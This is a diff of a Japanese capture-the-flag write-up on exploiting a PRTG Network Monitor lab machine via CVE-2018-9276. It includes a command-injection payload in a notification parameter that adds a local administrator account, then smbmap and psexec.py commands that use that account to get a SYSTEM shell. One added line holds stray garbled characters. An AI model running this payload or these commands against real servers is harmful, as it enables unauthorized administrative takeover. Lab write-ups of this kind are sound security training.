@@ -20,7 +20,7 @@ PRTG bandwidth monitor
 
 SMB
 
-の3種類のサービスが使われてるのを確認した。
+の3種類のサービスが使われているのを確認した。
 
 スキャンした結果、赤枠内のPRTGのバージョンが判明した為、googleから検索した結果、CVE-2018-9276の脆弱性が利用できるのを確認した。
 
@@ -139,50 +139,61 @@ Account Settings →
 
 Notifications→
 
-Add new Notification
+11Add new Notification１１１111１1
 
 ![94a809760f8a5f772e7cb1af9c5decf9.png](../_resources/94a809760f8a5f772e7cb1af9c5decf9.png)
 
-# 6.OSインジェクションを試行する。
+# 6.OSコマンドインジェクションを試行する。
 
 program file Demo exe notification – outfile.ps1
 
 parameterにtest.txt;net user pentestop P3nT3st! /add;net localgroup administrators pentestop /add
 
-net user ユーザアカウントを追加した。
+net user pentestop P3nT3st! /add
 
-net localgroup administrators 　指定したユーザを管理者グループに追加した。
+上記のコマンドを実行し、ローカルユーザアカウント「pentestop
+pentestopユーザの P3nT3st!パスワードを追加した。
 
-username prtgadmin
+net localgroup administrators pentestop /add
 
-password PrTg@dmin2018を入力した。
+作成したpentestopユーザを管理者グループのadministratorsに追加した。
 
 ![cbde80e4a400777524f6e963e918884f.png](../_resources/cbde80e4a400777524f6e963e918884f.png)
 
-OSインジェクションを実施した。
+OSコマンドインジェクションを実施する。
 
 作成したNotificationを実行できるのを確認した。
 
 ![bfba5762ac2138df97a5922022fc8968.png](../_resources/bfba5762ac2138df97a5922022fc8968.png)
 
-pentestopユーザを作成した。
+net user pentestop P3nT3st! /add;コマンドとnet localgroup administrators pentestop /addコマンドが通知をONにしたタイミングで実行されて
+
+pentestopユーザが追加されadministratorsグループに追加される
 
 `smbmap -H 10.10.10.152 -u pentestop -p 'P3nT3st!'`
 
-smbmapで確認した結果、管理者権限で共有フォルダに接続できる事を確認した。
+上記手順により作成したユーザアカウント「pentestop」がsmbmapの認証に使用できる可能性があることから
+
+smbmapを実行しSMBサービスへのログインを試行して認証に成功した。
 
 ![1a5ec544d7e4ed8939519bb0567bac9e.png](../_resources/1a5ec544d7e4ed8939519bb0567bac9e.png)
 
-パーミッションを確認した結果、管理共有C$ ADMIN$ がREAD,WRITEが許可されている為psexec.pyが使用できると推測した。
+SMB共有フォルダのパーミッションを確認した結果、C$ ADMIN$ のREAD,WRITEが許可されていることを確認した。
 
-psexec.pyを使用してリモートアクセスを試行した。
+その結果psexec.pyが使用できると推測した。
 
-psexec.pyは、IMPACKET Pythonモジュールに含まれる侵入テストスクリプトの一つです。このスクリプトは、Core Labsから提供されているIMPACKETツールセットの一部であり、侵入テストやセキュリティ評価のために使用されます。
+psexec.pyは、IMPACKET Pythonモジュールに含まれる侵入テストスクリプトの一つである。このスクリプトは、Core Labsから提供されているIMPACKETツールセットの一部であり、侵入テストやセキュリティ評価のために使用される。
+
+リモートログインできる条件は「管理者権限があること」とSMB共有フォルダ「ADMIN$」「C$」のパーミッションがREAD,WRITEであること。
+
+今回は上記条件を満たしているのでリモートアクセス可能であると推測し、試行した。
 
 `python3 psexec.py 'pentestop:P3nT3st!@10.10.10.152'`
 
 ![95ee0d18ab01d774214508f076c59022.png](../_resources/95ee0d18ab01d774214508f076c59022.png)
 
-whoamiコマンドからrootを取得できているかを確認した。
+システム権限ユーザ「nt authority\\system」でログインしたことを確認した。
+
+C:\\Users\\Administrator\\Desktopに移動してroot.txtを取得した。
 
 ![6a5c94e8da760a84627b33b47e9202c2.png](../_resources/6a5c94e8da760a84627b33b47e9202c2.png)
